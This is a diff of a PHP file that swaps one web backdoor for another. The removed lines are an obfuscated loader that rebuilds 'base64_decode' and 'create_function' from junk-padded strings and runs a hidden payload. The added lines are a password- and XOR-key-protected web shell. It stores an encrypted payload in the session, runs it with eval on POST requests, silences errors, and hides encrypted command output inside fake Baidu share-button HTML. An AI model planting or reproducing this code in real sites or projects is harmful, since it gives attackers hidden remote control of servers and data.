@@ -1,10 +1,59 @@
 <?php
-$rep = str_replace("n829urzlC5SAdsHmIWxMYcPgLRiT7p1f6wyvEQhVJUbtjDXFOGa34Zk0KqeN","","str_n829urzlC5SAdsHmIWxMYcPgLRiT7p1f6wyvEQhVJUbtjDXFOGa34Zk0KqeNrepln829urzlC5SAdsHmIWxMYcPgLRiT7p1f6wyvEQhVJUbtjDXFOGa34Zk0KqeNacen829urzlC5SAdsHmIWxMYcPgLRiT7p1f6wyvEQhVJUbtjDXFOGa34Zk0KqeN");
-$decode = $rep("45hvNqjk0zH6BbfwcK2VgZaYxPWt8yLRuo1mAC7XTEDMIJdQp9","","b45hvNqjk0zH6BbfwcK2VgZaYxPWt8yLRuo1mAC7XTEDMIJdQp9ase645hvNqjk0zH6BbfwcK2VgZaYxPWt8yLRuo1mAC7XTEDMIJdQp94_de45hvNqjk0zH6BbfwcK2VgZaYxPWt8yLRuo1mAC7XTEDMIJdQp9cod45hvNqjk0zH6BbfwcK2VgZaYxPWt8yLRuo1mAC7XTEDMIJdQp9e45hvNqjk0zH6BbfwcK2VgZaYxPWt8yLRuo1mAC7XTEDMIJdQp9");
-$func = $rep("gEWytIiKfhsGr85MjRALaDZqb6T4z71OVQ3UCYHFmXJnoB0u2clkxvNp9Sdw","","crgEWytIiKfhsGr85MjRALaDZqb6T4z71OVQ3UCYHFmXJnoB0u2clkxvNp9SdweagEWytIiKfhsGr85MjRALaDZqb6T4z71OVQ3UCYHFmXJnoB0u2clkxvNp9Sdwte_gEWytIiKfhsGr85MjRALaDZqb6T4z71OVQ3UCYHFmXJnoB0u2clkxvNp9SdwfgEWytIiKfhsGr85MjRALaDZqb6T4z71OVQ3UCYHFmXJnoB0u2clkxvNp9SdwungEWytIiKfhsGr85MjRALaDZqb6T4z71OVQ3UCYHFmXJnoB0u2clkxvNp9SdwctiogEWytIiKfhsGr85MjRALaDZqb6T4z71OVQ3UCYHFmXJnoB0u2clkxvNp9SdwngEWytIiKfhsGr85MjRALaDZqb6T4z71OVQ3UCYHFmXJnoB0u2clkxvNp9Sdw");
-$s1 = "ZXZmUV1pIvRkQsPY0wCTA9flz4q5uKOJ8Ndo7eLnaH36WZDXFGthMhbCmUV1pIvRkQsPY0wCTA9flz4q5uKOJ8Ndo7eLnaH36WZDXFGthMgkmUV1pIvRkQsPY0wCTA9flz4q5uKOJ8Ndo7eLnaH36WZDXFGthM";
-$s2 = "X1mUV1pIvRkQsPY0wCTA9flz4q5uKOJ8Ndo7eLnaH36WZDXFGthMBPU1mUV1pIvRkQsPY0wCTA9flz4q5uKOJ8Ndo7eLnaH36WZDXFGthMRbmUV1pIvRkQsPY0wCTA9flz4q5uKOJ8Ndo7eLnaH36WZDXFGthM";
-$s3 = "J3RimUV1pIvRkQsPY0wCTA9flz4q5uKOJ8Ndo7eLnaH36WZDXFGthMb0QmUV1pIvRkQsPY0wCTA9flz4q5uKOJ8Ndo7eLnaH36WZDXFGthMnmUV1pIvRkQsPY0wCTA9flz4q5uKOJ8Ndo7eLnaH36WZDXFGthMXmUV1pIvRkQsPY0wCTA9flz4q5uKOJ8Ndo7eLnaH36WZDXFGthMSmUV1pIvRkQsPY0wCTA9flz4q5uKOJ8Ndo7eLnaH36WZDXFGthMk7mUV1pIvRkQsPY0wCTA9flz4q5uKOJ8Ndo7eLnaH36WZDXFGthM";
-$ttk = $func("",$decode($rep("mUV1pIvRkQsPY0wCTA9flz4q5uKOJ8Ndo7eLnaH36WZDXFGthM","",$s1.$s2.$s3)));
-$ttk();
+@session_start();
+@set_time_limit(0);
+@error_reporting(0);
+
+function encode($D, $K){
+    for ($i = 0; $i < strlen($D); $i++) {
+        $c = $K[$i + 1 & 15];
+        $D[$i] = $D[$i] ^ $c;
+    }
+    return $D;
+}
+
+$pass = 'code';
+$payloadName = 'payload';
+$key = 'c13367945d5d4c91';
+
+if (isset($_POST[$pass])) {
+    $data = encode(base64_decode($_POST[$pass]), $key);
+
+    if (isset($_SESSION[$payloadName])) {
+        $payload = encode($_SESSION[$payloadName], $key);
+
+        if (strpos($payload, "getBasicsInfo") === false) {
+            $payload = encode($payload, $key);
+        }
+
+        eval($payload);
+        $left = substr(md5($pass . $key), 0, 5);
+        $replacedString = str_replace("bdsek", $left, "var Rebdsek_config=");
+        header('Content-Type: text/html');
+        echo '<!DOCTYPE html>';
+        echo '<html lang="en">';
+        echo '<head>';
+        echo '<meta charset="UTF-8">';
+        echo '<title>GetConfigKey</title>';
+        echo '</head>';
+        echo '<body>';
+        echo '<script>';
+        echo '<!-- Baidu Button BEGIN';
+        echo '<script type="text/javascript" id="bdshare_js" data="type=slide&amp;img=8&amp;pos=right&amp;uid=6537022" ></script>';
+        echo '<script type="text/javascript" id="bdshell_js"></script>';
+        echo '<script type="text/javascript">';
+        echo $replacedString;
+        echo base64_encode(encode(@run($data),$key));
+        echo ";";
+        echo 'document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=" + Math.ceil(new Date()/3600000);';
+        echo '</script>';
+        echo '-->';
+        echo '</script>';
+        echo '</body>';
+        echo '</html>';
+    } else {
+        if (strpos($data, "getBasicsInfo") !== false) {
+            $_SESSION[$payloadName] = encode($data, $key);
+        }
+    }
+}
 ?>
